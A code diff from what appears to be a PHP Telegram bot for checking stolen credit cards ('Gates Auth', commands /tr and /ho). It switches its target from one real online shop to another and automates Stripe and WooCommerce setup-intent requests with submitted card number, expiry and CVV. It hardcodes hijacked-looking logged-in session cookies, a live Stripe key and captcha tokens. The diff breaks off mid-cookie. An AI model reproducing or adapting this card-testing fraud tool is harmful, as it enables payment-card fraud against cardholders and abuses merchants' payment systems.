@@ -1155,7 +1155,7 @@ elseif((strpos($message, "!chds") === 0)||(strpos($message, "/chds") === 0)||(st
 
 elseif((strpos($message, "!ats") === 0)||(strpos($message, "/ats") === 0)||(strpos($message, ".ats") === 0)) {
         //$respuesta = "\n◤━━━━━ ☆ 𝙶𝙰𝚃𝙴𝚂 𝙰𝚄𝚃𝙷 ☆ ━━━━━◥\n\n🔥 Stripe Auth 3DS ✔\n➣ Checker ➟ !he\n⁕ Usage: !he ccs|month|year|cvv\n\n🔥 Stripe Auth ✔\n➣ Checker ➟ !ho\n⁕ Usage: !ho ccs|month|year|cvv\n\n⟐ Contact ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n⟐ Bot by ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n";
-        $respuesta = "𝘼𝙡𝙮𝙖 𝙎𝙖𝙣 ➟ Gates Auth\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n🔥 Braintree CCN_V3 ✔\n➣ Command ➟ /he\n⁕ Status: ON!✅\n\n🔥 Braintree Auth ✔\n➣ Command ➟ /ho\n⁕ Status: ON!✅\n\n⟐ Contact ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n⟐ Bot by ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n";
+        $respuesta = "𝘼𝙡𝙮𝙖 𝙎𝙖𝙣 ➟ Gates Auth\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n🔥 Braintree CCN_V3 ✔\n➣ Command ➟ /tr\n⁕ Status: ON!✅\n\n🔥 Braintree Auth ✔\n➣ Command ➟ /ho\n⁕ Status: ON!✅\n\n⟐ Contact ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n⟐ Bot by ➜ <a href='t.me/D4rkGh0st3'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>\n";
         sendMessage($chat_id,$respuesta,$message_id);
 }
 
@@ -2798,20 +2798,17 @@ ob_flush();
 }
 
 	
-	
-elseif((strpos($message, "!he") === 0)||(strpos($message, "/he") === 0)||(strpos($message, ".he") === 0)){
+elseif((strpos($message, "!tr") === 0)||(strpos($message, "/tr") === 0)||(strpos($message, ".tr") === 0)){
 
 $lista = substr($message, 4);
-//$i     = explode("|", $lista);
 $i = preg_split('/[|:| ]/', $lista);
-$cc    = $i[0];
-$mes   = $i[1];
+$cc    = trim($i[0]);
+$mes   = trim($i[1]);
 $ano  = trim(substr($i[2], -2));
-$cvv   = $i[3];
+$cvv   = trim($i[3]);
 
 $bin = substr($lista, 0, 6);
 ////
-$num = "$cc$mes$ano$cvv";
 
 $longitud = 4;
 $partes = [];
@@ -2819,76 +2816,65 @@ $partes = [];
 for ($i = 0; $i < strlen($cc); $i += $longitud) {
     $parte = substr($cc, $i, $longitud);
     $partes[] = $parte;
-}
+}                                                                     
 
-	
+$bin = substr($lista, 0, 6);
+$num = "$cc$mes$ano1$cvv";
 //-----------------------------------------------------//
 $verify = substr($cc, 16, 1);
-if($verify != ""){
-$respuesta = "🚫ᴄᴄ ɴᴏ ᴠᴀʟɪᴅᴀ🚫\n";
-sendMessage($chat_id,$respuesta, $message_id);
-die();
+        if($verify != ""){
+		$respuesta = "🚫ᴄᴄ ɴᴏ ᴠᴀʟɪᴅᴀ🚫\n";
+                sendMessage($chat_id,$respuesta, $message_id);
+                die();
 }
 
 if(is_numeric($num) && $lista != '' && $cc != '' && $mes != '' && $ano != '' && $cvv != ''){
+
 }else{
-$respuesta = "━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /he cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 2: !he cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 3: .he cc|m|y|cvv\n";
-sendMessage($chat_id,$respuesta, $message_id);
-die();
+        $respuesta = "━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /tr cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 2: !tr cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 3: .tr cc|m|y|cvv\n";
+        sendMessage($chat_id,$respuesta, $message_id);
+        die();
 }
-
-
 //----------------MENSAGE DE ESPERA-------------------//
 $respuesta = "<b>🕒 Wait for Result...</b>";
 sendMessage($chat_id,$respuesta, $message_id);
 //-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
 $id_text = file_get_contents("ID");
-//----------------------------------------------------//
+        //----------------------------------------------------//
+
+$cc = implode('+', $partes);
 
 $startTime = microtime(true); //TIEMPO DE INICIO
 $BinData = BinData($bin); //Extrae los datos del bin
-$cc = implode('+', $partes);
-//sendPv($myid, 'error4..');
-
 $curl = curl_init();
 curl_setopt_array($curl, [
-  CURLOPT_URL => 'https://healthyfungi.com.au/my-account/add-payment-method/',
+  CURLOPT_URL => 'https://www.thetravelinstitute.com/my-account/payment-methods/',
   CURLOPT_RETURNTRANSFER => true,
   CURLOPT_ENCODING => '',
   CURLOPT_MAXREDIRS => 10,
   CURLOPT_TIMEOUT => 30,
   CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
   CURLOPT_CUSTOMREQUEST => 'GET',
-  CURLOPT_COOKIE => 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-08%2019%3A36%3A40%7C%7C%7Cep%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-11-08%2019%3A36%3A40%7C%7C%7Cep%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F130.0.0.0%20Mobile%20Safari%2F537.36; wordpress_logged_in_febd530ada708d5093f883308bac36a7=rg2004j%7C1732304472%7CpblBuEHjl1mFZlV6P65yKlAcq4U25lj3NmtqOf78qrz%7C7cf3e7871efb13634e7094dac3694c8fbd343128b0365673a9e938aeebea5f7f; sbjs_session=pgs%3D12%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2Fmy-account%2Fpayment-methods%2F',
+  CURLOPT_COOKIE => 'mailchimp_landing_site=https%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2F; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-16%2022%3A08%3A57%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-11-16%2022%3A08%3A57%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Mobile%20Safari%2F537.36; mailchimp.cart.current_email=Dausitherer@cuvox.de; mailchimp_user_email=Dausitherer%40cuvox.de; wordpress_logged_in_104df0bcc01c764423018f9bcd47f262=dausitherer%7C1733004640%7CjNLKpX4cGcCWRTyAV9VhWYrkcDAsoRMd2WR7RBsbGze%7Ced04d655c45184593572d62e373fda864f4990e1661e7924e0a456cd68646307; __stripe_mid=aa379a42-e19a-4c90-9052-16328908a242d00773; __stripe_sid=8f88d6a3-78fb-4159-8d1d-179c9838144e9732ca; sbjs_session=pgs%3D6%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2F',
   CURLOPT_HTTPHEADER => [
-    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
+    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
     'sec-ch-ua-platform: "Android"',
-    'referer: https://healthyfungi.com.au/my-account/payment-methods/',
+    'referer: https://www.thetravelinstitute.com/',
   ],
 ]);
 
-
-
 $response = curl_exec($curl);
 $err = curl_error($curl);
-
-// Extraer pk_live
-$patron_pk = '/"publishableKey":"([^"]*)"/';
-preg_match($patron_pk, $response, $matches_pk);
-$pk_live = $matches_pk[1];
-
 // Extraer nonce
-$patron_nonce = '/"createSetupIntentNonce":"([^"]*)"/';
+$patron_nonce = '/"createAndConfirmSetupIntentNonce":"([^"]*)"/';
 preg_match($patron_nonce, $response, $matches_nonce);
 $nonce = $matches_nonce[1];
 curl_close($curl);
 
 
 
-//echo "$pk_live\n";
-//echo "$nonce\n";
-
 $curl = curl_init();
+
 curl_setopt_array($curl, [
   CURLOPT_URL => 'https://api.stripe.com/v1/payment_methods',
   CURLOPT_RETURNTRANSFER => true,
@@ -2897,17 +2883,17 @@ curl_setopt_array($curl, [
   CURLOPT_TIMEOUT => 30,
   CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
   CURLOPT_CUSTOMREQUEST => 'POST',
-  CURLOPT_POSTFIELDS => 'type=card&card%5Bnumber%5D='.$cc.'&card%5Bcvc%5D='.$cvv.'&card%5Bexp_year%5D='.$ano.'&card%5Bexp_month%5D='.$mes.'&allow_redisplay=unspecified&billing_details%5Baddress%5D%5Bpostal_code%5D=10010&billing_details%5Baddress%5D%5Bcountry%5D=US&payment_user_agent=stripe.js%2F1a86f4d606%3B+stripe-js-v3%2F1a86f4d606%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fhealthyfungi.com.au&time_on_page=28600&client_attribution_metadata%5Bclient_session_id%5D=4fc4657d-b5ce-496d-98e3-4cabe6bb1284&client_attribution_metadata%5Bmerchant_integration_source%5D=elements&client_attribution_metadata%5Bmerchant_integration_subtype%5D=payment-element&client_attribution_metadata%5Bmerchant_integration_version%5D=2021&client_attribution_metadata%5Bpayment_intent_creation_flow%5D=deferred&client_attribution_metadata%5Bpayment_method_selection_flow%5D=merchant_specified&guid=4485f0fe-2a44-46ca-8a18-6775167b89bcebfec0&muid=53e89807-84e5-4a98-a6e5-1f91e51883aa844aaf&sid=cc06746a-e59e-4944-b9a9-35894a6b552d4eb28c&key='.$pk_live.'&_stripe_account=acct_1PLz1dC08E2V4AsU&radar_options%5Bhcaptcha_token%5D=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiN0FxMGQydktRWll3cUZydkVDb1oyZ01zcXpYMUREdS8wY0VZRFFHdExhbnRkNEw1RlowLzMzS1BPMEZZaVFSRmhYLy96WWd5YzI0Y0RFWFpUa0hHUUVuSDlUYTZ3aTYxWTZoMjN1bTFUUE42SW54RldFb3laVzZhbnlKcVlJWWhJcFo2bVMvTDVhNHhpRnZJdmNKQ0g0enlVaDlENHVCQXNlRGI3MnNhSE45U0p5azRsRmQrMHd4dkJDc2tNTlNINHhwN1lDTzFFUkJFbmN1NXNEWGVLM05LaGU3RXZCS2h5R3pSdG9IdXl1VmtxenVvK1pqRHNlZHorNkpjdENmRXh2UzNkeGtpYU1paW5PTHJQbmZZVTh0RTJKR3JpWEJHZmZzK29MNUdQNDBGZjMranlXSG5adzNyaFR2ekM0QnVrYVoxNXowOTNUV1gwVmcyYjJuanZVTkxiaktSaXA2cW91VUFPb29nRzNnRUY4SHNqUzhMWEUrMmtBU3ZTMFVuMlAwZXl1WVM4YUt1KzZQVWdyUHkxZW9CbHdlMjFoL0tudzJTMGcvTXdDYVpSc1E1blhPK29qQUtKNzMzeWJPbmpHTGx2UkN3SEcwelo2NlpTc3JZU0w3SzdPV1ZnSHVFS3F1OVhpTDZmaFZnb0NQYzgyVExCblJ1Yko3cnNCYytmU0UxbWh5QzRSUEVnbFhyV2ZwelVCY3FHVXpObWt0ejJaa1VYRE5GNDNuZ01BOWwxc29WL3B1aHJGTTh5KzRBQ2dSM0pSQWtTNG5XVFErVVoyYVdVRTBJWVRsSjV2TTFHOUZ4azl3VTdnNHIyUDdiWnczQkRjaUw4WFQvQ3Jpbkp3enU1NEdrL1c5MDhieURmYjdOL2xwWlFrdlk5bjJuZkRBWm5GV0g3WHZRTzdUNTNCNURqQy9vOUlkRERybm9mK0RsZ1QxRVgxd2t5THVLNWgra0wwdE1teDgvR2dJc3VmZzJTNHlleWVUMS9ValZOMmhCSlZ5Y3VBR1MwcjBCNkxyU0tiZTVSQ0NrYVl0OGw4SFBOekh3OFFYbW5RM2d0dElWVlMxTWRSTnlqRm8yUVhpR0lBWnZwNVVDQlFDNGRWSmxPODd4OU5HeEdFcnRrdjAyQ1hqK2pKNkIrSlVzN0h4NmZSM2tYMGhYT1piTHNJQVVzWFBHSEVTOGZKNk9ZNXprUzRPcCtqZVN4Tk81cHE5OTltZGVaNVlFejJtRXY5TkFhNnFGTmVyaHQvbk5FVjc0aTZOY1dxeXZiT0piZ0V5NnhpNmdmYWlFQVVOT0hUSnRFNVBOSWxiQkRQOEh1SjMySWZnR2h1aFd4YllSSWcrTkp6WnVjc0dYY0VDUHMvaC8rN29oT0NLZlVFWTdZYXBIYWU4UUpMZ1dRZ2hKaWtIZTA0TC9FeG85YmU4QWdmWXliZy8wWElYKy9qSjFhT3ZIRDg3K1lZeWdOQXNDYXR4WVNZVW9WdzVUQXFjb1VJQ1hsZVA5SThrdUNJSUFNaG95OGdjc1paVWRZRlZ2eldyOG1kODgrelFIelhCYU5lZ0k0dWR3eENqRkYrdUxXYkhVd1RlTnlIWGxaM0JlMlpQYzArMWd2cWgwa0J0ZEZlTlk1a3hxQUZIUzFsZHlXY3d4QzdJczFyMVQ4R29ESHh5ODVZRFRGQjJxRy9DNW5zcFhzTmV5VThmcUdSN1NvZ2VaSEFBczcyc1p2cE45S0VycU5ldklUUDdUSzNaQi9JV2hTM01lZExLc2gvSWRBV2JLeVUwRVFObjlqSkRXNlNPSVRlV0prK2NWVTlWcHgxZHM5cEtYT3RieEdPUmlyaWRuSENXaktWZVcxSVpmdFVOZXZLSjMveW04b1dBOFJIWlh0TXQxQXFYWkwxa0dxMmhIcDN4akY3ZTFKay9kOEwvZWRlWDA1MWNkTEh5eDVwUEtSUFN3K3crSE5TN0tpdUJqQ1BxU0RBWXJ6ams1SWpkd0Q2RWlpMytvRitnK0YzRXBxQU1EUThtY2I3Rjg1MGlZMWswYTVZWnJSVzNRdk5wc05NQ1prNUNwcWcvU2dtU1puL09SNW9NZHI4aXZsM3FtZFdCMDNtTC9qbGlMV3NZc3dMZ1Z0UXlYMVVzbjRCVDBEZ3hUS3ZPNUdpbVV5WDFOYmx1TjFqaGxFaTU3NEpFSGNLNDRLSjZrcnJFWHVSbkEwOVd4dVB3bi8wZUhGNURHWTA0a1Bjc0JyRlFGSEkrVGtxYlJoTndJd1Ywd1FFYjFXTnV2My9lTjdiS1pSVFhzYmJFZUtXeE91clJ3OGJ4ZzRzRFdVN3hYL0QrSXZTZDFwTkE2VVRicjErK1Y4bWg5QWY5SW54Y08zRzFrOS82Szc0SmRveVhORmxXVlBuSGJwYlFlTDRBNU5Zc295Sm1aSFExeVpSYjh0MllrY1liUExKN25zNjhEblRyNnFDckV1VDUwamtnNTVHRnI3U3JjNDVjNFhlM2VBRDQ4U1YvMTdsTzltMVdCcXI1ejVYb2kvQjQrVEkya2xoaVNCOFFOUWhKZ284b2IwSEcvMGVCV3ZZREJVbFVRcTJ0R09tQkFtbVplZ1J5dEZMM0RJekdVWGxtd3M1eHk0ZGE2RnNydEJQa2w2Y0duUkI2eC9Ua1FlMzFsa040dGRZWktaMkIzU3N3a3pibVhLYll3ektUUUh1SnlxRXVmdjM2R0dsZWdqRlFxQ2l4S2tMRXNYRzF5MFR4S1pqVTYvcXBBdFVQZzM1UnVFT3ZLSTRkVjJUWT0iLCJleHAiOjE3MzEwOTUwMzcsInNoYXJkX2lkIjoyMjE5OTYwNzMsImtyIjoiMzgwMmQ4ZGMiLCJwZCI6MCwiY2RhdGEiOiJYM1ZEN0hOMEJxTG5zQ3ZreUhLZmRQZHE0cmZDeU11K05oeGpzejBtMEp5ZXBPMXVNanBmK3E4elEwbkpwRFZtYnhPTDlzbThRaGsyZlZvb1I1cjFZeXQ1aVRTbWlsWUpyNmF3eW55dzZJVDlVU0owSTVrVzFnWkNrdy9vcDhMaTZ0dElFcnZ4dGJkTUhVTkVWamtNb3lyMExFbkFWSGRiWkRYSUQzYUd0TnpmUzNTQWpTU0s1ZU1mS3VUN056VVdyR1IxL1pUenR5SHErSTVFIn0.jU97WVh25hH7Qr30Fie7iDKvP1O3zZzC4MMAA0_48Do',
+  CURLOPT_POSTFIELDS => 'type=card&card%5Bnumber%5D='.$cc.'&card%5Bcvc%5D='.$cvv.'&card%5Bexp_year%5D='.$ano.'&card%5Bexp_month%5D='.$mes.'&allow_redisplay=unspecified&billing_details%5Baddress%5D%5Bpostal_code%5D=10080&billing_details%5Baddress%5D%5Bcountry%5D=US&pasted_fields=number&payment_user_agent=stripe.js%2Fa3221739cb%3B+stripe-js-v3%2Fa3221739cb%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fwww.thetravelinstitute.com&time_on_page=43855&client_attribution_metadata%5Bclient_session_id%5D=d65d0026-84e4-4fec-83f1-a3244cc849e5&client_attribution_metadata%5Bmerchant_integration_source%5D=elements&client_attribution_metadata%5Bmerchant_integration_subtype%5D=payment-element&client_attribution_metadata%5Bmerchant_integration_version%5D=2021&client_attribution_metadata%5Bpayment_intent_creation_flow%5D=deferred&client_attribution_metadata%5Bpayment_method_selection_flow%5D=merchant_specified&guid=aa647898-0f7b-4647-a052-33a1d2f18d9464e5e8&muid=aa379a42-e19a-4c90-9052-16328908a242d00773&sid=8f88d6a3-78fb-4159-8d1d-179c9838144e9732ca&key=pk_live_51JDCsoADgv2TCwvpbUjPOeSLExPJKxg1uzTT9qWQjvjOYBb4TiEqnZI1Sd0Kz5WsJszMIXXcIMDwqQ2Rf5oOFQgD00YuWWyZWX&_stripe_version=2024-06-20&radar_options%5Bhcaptcha_token%5D=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoianlGTXJ1c0txTnRkMXJXSEhqMC9MYUltZG9IaXZqM2RDeFVSWXhpTjFmMzRxc0JCMUlteTVUdVg0a1VZbWI5UDg1MGtUemIxKzQ2WThyZWg5aUl6TjhFSWJrRGVNTTlXT2JmT1VseklsYUtRUWRNRjdoVXVadHN4SnNRTWJ5U1B1cHFsN0ExQXZaYmpHbk0rL3RYelhMNnRaT0pTR1ZXNUF1RjVLMXRCd0dncUFNTjI0T1JoL1JNUjlQdjhrNmc4TTBOaW5VNE5ERmNwempZbExaODJXSlNBMWJBZWd5MFdaTXBBQWgxeEhLcDl2NkJEcllhcUtYbENoemVJUFNPeHg3L3djV0JMei9OWEhTSEtYbXZVUDVuRkhXNko5UFg4cjZ2MFAxblJHMElZSTl0aDBuSzVUcTdTTnJjYmNsRmZoWUZUZGhtY2pHQ24vM1pZa2xxblI5TTM1MXFDVldOTjJCdWJqcGVONHBSQXlQOWRrS1BYdXhNeDE0djRiSzI1R0tpcXp0Y0lmL25UNkw0bnNpUjZWbk1GdGdqY2VmUFZvd1QvMGdyMUs4akNHc1c4dy96bTlHcm9pZlAwWm1UaERvWjJaZ2ZiNEtpQ0ZaUlp2Vlk0VVZJS2w3YnRucitxNmNOSE1mbENIYm9qUldlRXY5TXh3ekFKM3NXMjB3UWQrZXNqNE9VeGJBdGZPZTFydVF1T2VSV0RLK2lnTU90Yk9jTXRFYTdScDBxeTB0ZTZ6VzFtb0tUUkROQ3FUYVRub0Q5QVZxTDMxYkFYa01HKzJ1azYxdlltWWp3UjQ5eVlFdmh3ZEo5RWlEMUdpc2hPaHFJZnpIUmxicXhEUXF3N2hKeUc5a1Y5dXVBWFJjTDJIWTNWS3JHRzF3em1kTVBvbXJrT3IyNGh3WUVGYUxHdDlLY0dwMnMwQmpnM09pSVlOenFRcGhBNjFJREoza2Nha09MTUpJcVE1eUdza2xMdDNYWU5SWVEyYmtma1huZDZtRTIxQjlUMTRvSTEwWnh6clJDVGtjM3crT1Y4NXhrUGtGcjVhU2lWT3NJaFU2QUtSMy82b01FL2FOakNpU0ZmYkxMbDJDUmgxelIrYVRsa3prR2RJaVg4b1Jxb2I2WU9DSS9ha2NtMGU3S3FnbWJBckZHRGRSSjZWUUFrbHBsNlAxWWRqeG41eHN4bVR3Ui96amxDVXdYTk1QczJEcnFRc3lsRE10dWsyUUhhbGR0MEUrcTJaQzFuckZYMXJJWVVDWExoUHFoc1g2NzVJamNWb29mbGErYUdqVkt3SzBNT3dnYzVyYVhmQVB5a1gvemxsWU5tQzRFTjZRaG9VYWtUWjNMUzNTVmFZYnFjcFJnbUlrekhTbE82ZStyZjZsaSs5Z000SldndDNBK1RuVytHdS84RmdNKzJKcFZ2SEJlYTdwOFIwbUdaS1ozV3VLMmZ4S1pPOE0rT0ZGRlJES3VObmM5SWRaVjdUMzV0UmQyblpPYVhnL09wYzcxS2gwbUVYU1FWdGx4T3dzQnJHOFRaN0lmcjBQMWlMUVU4N0MwSVA3NjZzZEdNRWt0WFZqNnJVUGt6U0hTT2ZTZnhGK1dPa2tWTjN5MG82T3VRVk9oZHpRT3NqNEtHcWhhNkZCSFdYa1RRVWNub2hPMDBGSzNhWmFHVnBJRGdjNWRia3kzWXZvMmJmajhTTGlLdHR5U0tCaEZoLzVWVk9IQWJXSUhOUE14U3lVNkxiYzRaQWRxMGdtKy9zdlZxQ1NHWjdFNS9ZRWtnNldUVFA1UmRMU0xqaERld2hqaFFDSzhKRlBnVnJOcGViZ25wSjRPenBuS1g1K3dmVlNHRTFtWjEwa0VDR09LdUdHZlU0ZGh1ME1zdHR1WFdzTU5CcW9oUDBBbHJIZmpINmhTSFJPYS9uV3kxeER4VlNxWTRqdS9haXR0dFdCdmJuSWhBTURNb3hoUTZjYnRvSlc4NjNGajFFVmhVdjQyQnQ2a0ZReHB6MnJ1UHpTVHQxS21HeHdOQjJoMnJ5M3JjTmo5alRqSFZwZDZud2VCYk52R0xrUjVzVEorZ1kwYm1lOUkxN0lEY2I3RjhmZDlLakZNZXJMQmNVaW16VDVNOElhalNyMWkxZFdxVk8zQ216SFhBNWdsRTJybnJZY0JCNEJOWGVOSUZJL0FBcWZ5blFpaGhuMDZyZjFmUU9hUTFFaUE1ZzBMWWJSZXhRNzBSc0ZjdWlLZXBkcElDOEpBSDdjQ1pMeW11NXQ5YksvWXlka3dWZ1lrK2ZwNXlrZU1hVDA4bzJPQ0N5OE9DVTBiZjVzdHVweXR5ci9Ob3RWMjBPVHVoSW1NdnlhZVdUYkwyNEVDMjlZQ2hxeXhOU0FZM0pVSkZTT0hQRTcwUEZEbnZkM2F2aUJrMXpiRFQrQVlQTlBZaVBtaWNGbjZaaVJsWnR3eEczdjFvSFpjZUw5eVdtZ2I5Vkd4ZmR6YWVYRFNHdmdrOUJoYVhhMmhxMDMxSkVvQTY2RFBVMDhUaDYweTVNZ1FZMnd4UHZYS3RPTFJNT24vNVJCVlNsVGdjSVlPVkc1U1RKQ3ljeUFOMzhBRkJ2SGFnRTFNUjE5MTFjTWdIZmkrTFVaQkQzU2FEY3hhK0xqUjJxTGpFTlBPZ1E0TUo2NU1rS3NlaWRURlBHQzRrSTFBdkwrMzhTK2VxR09rWHlZSDBwTWdXNnNSbHlTL1F4TWg1dk95ZTNyWjdxRnRSdWoyd3p0TUJzeVBZdDZEelpPRDRHRjJiaDIzRUM4cTJvOWpubXQranhyQU82QWloeDdLRUJqakFPbHRVcnFvenZBPT0iLCJleHAiOjE3MzE3OTYxODEsInNoYXJkX2lkIjoyMjE5OTYwNzMsImtyIjoiZThhZGM2NCIsInBkIjowLCJjZGF0YSI6IklQZWowTkcyem5UNFZ2ZENDbEtQWHpkenFZb0J5cnFGNTlnbGpyOUFuNGJ6V3ZDQ0xudERHWmpKVFhITDJuM1lRR09oblpiODEra2dtcGNad3F5K3l0M1Q1V2JYVTJJOVZNRzA4cS9FeFNjTVFiVGNmR3JBdDI4QkZBNTBlUFR4NnZ4SUE0V1pEUnUvUWl3Q2YvVTJPZW1KN3cvdWc0SFFhRzhmNW11bzVXN3ptREYyT1JzM3B0dThvZ3d6d2Q1M1RpNHM1QWdvYTVETFFhNm4ifQ.KTZJIXxZUrKFOeJkr5o2EHvQuJH4DWPa7I26QT_qZ-k',
   CURLOPT_HTTPHEADER => [
-    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
+    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
     'Accept: application/json',
     'Content-Type: application/x-www-form-urlencoded',
     'sec-ch-ua-platform: "Android"',
+    'accept-language: es-US,es;q=0.6',
     'origin: https://js.stripe.com',
     'referer: https://js.stripe.com/',
   ],
 ]);
-
 
 
 $response = curl_exec($curl);
@@ -2917,44 +2903,31 @@ $id = $json["id"];
 curl_close($curl);
 
 
-//echo "ID $id\n";
-
-
-
-
 $curl = curl_init();
-
 curl_setopt_array($curl, [
-  CURLOPT_URL => 'https://healthyfungi.com.au/wp-admin/admin-ajax.php',
+  CURLOPT_URL => 'https://www.thetravelinstitute.com?wc-ajax=wc_stripe_create_and_confirm_setup_intent',
   CURLOPT_RETURNTRANSFER => true,
   CURLOPT_ENCODING => '',
   CURLOPT_MAXREDIRS => 10,
   CURLOPT_TIMEOUT => 30,
   CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
   CURLOPT_CUSTOMREQUEST => 'POST',
-  CURLOPT_POSTFIELDS => [
-    'action' => 'create_setup_intent',
-    'wcpay-payment-method' => ''.$id.'',
-    '_ajax_nonce' => ''.$nonce.'',
-  ],
-  CURLOPT_COOKIE => 'wordpress_sec_febd530ada708d5093f883308bac36a7=rg2004j%7C1732304472%7CpblBuEHjl1mFZlV6P65yKlAcq4U25lj3NmtqOf78qrz%7Ce541956337674ea4cc613bf003c672f3ca4e87d5533a58c57e99372cf68a9c38; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-08%2019%3A36%3A40%7C%7C%7Cep%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-11-08%2019%3A36%3A40%7C%7C%7Cep%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; 